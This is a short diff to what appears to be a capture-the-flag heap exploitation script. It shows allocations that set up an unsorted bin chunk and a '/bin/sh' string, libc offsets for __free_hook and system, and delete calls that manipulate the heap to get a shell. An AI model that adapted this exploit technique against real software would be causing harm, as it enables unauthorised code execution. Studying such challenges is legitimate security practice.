@@ -26,7 +26,7 @@ def telescope(idx):
 
 
 record(0, 0, 0x87, '0')
-record(0, 0, 0x1000, '1')
+record(0, 0, 0x1000, '1') # unsorted bin chunk
 record(0, 0, 0x87, '2')
 record(0, 0, 0x87, '3')
 record(0, 0, 0x87, '/bin/sh')
@@ -39,7 +39,6 @@ free_hook = libc + 0x1eeb28
 system = libc + 0x55410
 
 delete(2)
-adjust(0, 0, 0)
 record(0, 0, 0x1000, 'C')
 delete(1)
 delete(3)
